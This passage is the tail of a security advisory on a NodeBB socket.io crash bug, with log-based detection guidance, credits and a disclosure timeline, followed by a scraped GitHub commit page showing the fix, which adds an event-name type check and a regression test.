    ...
}

```
## Detection Guidance:[#](#detection-guidance)

It is possible to search for the following error messages in NodeBB’s standard output/error and their respective log files to identify exploitation attempts of this vulnerability:

```
error: uncaughtException: eventName.toString is not a function
error: TypeError: eventName.toString is not a function
error: uncaughtException: eventName.startsWith is not a function
error: TypeError: eventName.startsWith is not a function
3 restarts in 10 seconds, most likely an error on startup. Halting.

```
## Credits:[#](#credits)

Ngo Wei Lin ([@Creastery](https://twitter.com/Creastery)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg))

## Timeline:[#](#timeline)

* 2023-03-27 Vendor Disclosure
* 2023-03-27 Initial Vendor Contact
* 2023-03-28 Vendor Patch Release (v2.8.10) containing partial fix
* 2023-04-11 Vendor Patch Release (v2.8.11) completely fixing vulnerability
* 2023-09-29 Public Release

[« Prev

(CVE-2023-4198) Dolibarr ERP CRM (<= 17.0.3) Improper Access Control](https://starlabs.sg/advisories/23/23-4198/)
[Next »

(CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2](https://starlabs.sg/advisories/23/23-2315/)

© 2024 [STAR Labs](https://starlabs.sg/)
Powered by
[Hugo](https://gohugo.io/) &
[PaperMod](https://git.io/hugopapermod)



=== Content from github.com_fa5e622d_20250111_071150.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F37b48b82a4bc7680c6e4c42647209010cb239c2c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F37b48b82a4bc7680c6e4c42647209010cb239c2c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=NodeBB%2FNodeBB)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NodeBB](/NodeBB)
/
**[NodeBB](/NodeBB/NodeBB)**
Public

* [Notifications](/login?return_to=%2FNodeBB%2FNodeBB) You must be signed in to change notification settings
* [Fork
  2.8k](/login?return_to=%2FNodeBB%2FNodeBB)
* [Star
   14.3k](/login?return_to=%2FNodeBB%2FNodeBB)

* [Code](/NodeBB/NodeBB)
* [Issues
  152](/NodeBB/NodeBB/issues)
* [Pull requests
  32](/NodeBB/NodeBB/pulls)
* [Actions](/NodeBB/NodeBB/actions)
* [Projects
  1](/NodeBB/NodeBB/projects)
* [Wiki](/NodeBB/NodeBB/wiki)
* [Security](/NodeBB/NodeBB/security)
* [Insights](/NodeBB/NodeBB/pulse)

Additional navigation options

* [Code](/NodeBB/NodeBB)
* [Issues](/NodeBB/NodeBB/issues)
* [Pull requests](/NodeBB/NodeBB/pulls)
* [Actions](/NodeBB/NodeBB/actions)
* [Projects](/NodeBB/NodeBB/projects)
* [Wiki](/NodeBB/NodeBB/wiki)
* [Security](/NodeBB/NodeBB/security)
* [Insights](/NodeBB/NodeBB/pulse)

## Commit

[Permalink](/NodeBB/NodeBB/commit/37b48b82a4bc7680c6e4c42647209010cb239c2c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: don't crash if event name is not a string

[Browse files](/NodeBB/NodeBB/tree/37b48b82a4bc7680c6e4c42647209010cb239c2c)
Browse the repository at this point in the history

* Loading branch information

[![@barisusakli](https://avatars.githubusercontent.com/u/2583394?s=40&v=4)](/barisusakli)

[barisusakli](/NodeBB/NodeBB/commits?author=barisusakli "View all commits by barisusakli")
committed
Mar 27, 2023

1 parent
[e9a8e19](/NodeBB/NodeBB/commit/e9a8e19508cea1764f75f2e14d65f32010f9b91b)

commit 37b48b8

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**15 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src/socket.io

  + src/socket.io/index.js
    [index.js](#diff-b80b656e3a5aab4f2f91937701c22e8fa18cc98ee7515a225114605113a94004)
* test

  + test/socket.io.js
    [socket.io.js](#diff-456373237cc0394a6c1a41faf91fb0bbc74dbc2a3e601c61965c495674f37610)

## There are no files selected for viewing

7 changes: 6 additions & 1 deletion

7
[src/socket.io/index.js](#diff-b80b656e3a5aab4f2f91937701c22e8fa18cc98ee7515a225114605113a94004 "src/socket.io/index.js")

Show comments

[View file](/NodeBB/NodeBB/blob/37b48b82a4bc7680c6e4c42647209010cb239c2c/src/socket.io/index.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -120,7 +120,12 @@ async function onMessage(socket, payload) { |
|  |  | return winston.warn('[socket.io] Empty method name'); |
|  |  | } |
|  |  |  |
|  |  | const parts = eventName.toString().split('.'); |
|  |  | if (typeof eventName !== 'string') { |
|  |  | const escapedName = validator.escape(String(eventName)); |
|  |  | return callback({ message: `[[error:invalid-event, ${escapedName}]]` }); |
|  |  | } |
|  |  |  |
|  |  | const parts = eventName.split('.'); |
|  |  | const namespace = parts[0]; |
|  |  | const methodToCall = parts.reduce((prev, cur) => { |
|  |  | if (prev !== null && prev[cur] && (!prev.hasOwnProperty || prev.hasOwnProperty(cur))) { |
| Expand Down | |  |

9 changes: 9 additions & 0 deletions

9
[test/socket.io.js](#diff-456373237cc0394a6c1a41faf91fb0bbc74dbc2a3e601c61965c495674f37610 "test/socket.io.js")

Show comments

[View file](/NodeBB/NodeBB/blob/37b48b82a4bc7680c6e4c42647209010cb239c2c/test/socket.io.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -107,6 +107,15 @@ describe('socket.io', () => { |
|  |  | }); |
|  |  | }); |
|  |  |  |
|  |  | it('should return error for invalid eventName type', (done) => { |
|  |  | const eventName = ['topics.loadMoreTags']; |
|  |  | io.emit(eventName, function (err) { |
|  |  | const eventAsString = String(eventName); |
|  |  | assert.strictEqual(err.message, `[[error:invalid-event, ${eventAsString}]]`); |
|  |  | done(); |
|  |  | }); |
|  |  | }); |
|  |  |  |
|  |  | it('should get installed themes', (done) => { |
|  |  | const themes = ['nodebb-theme-lavender', 'nodebb-theme-persona', 'nodebb-theme-vanilla']; |
|  |  | io.emit('admin.themes.getInstalled', (err, data) => { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `37b48b8`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNodeBB%2FNodeBB%2Fcommit%2F37b48b82a4bc7680c6e4c42647209010cb239c2c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


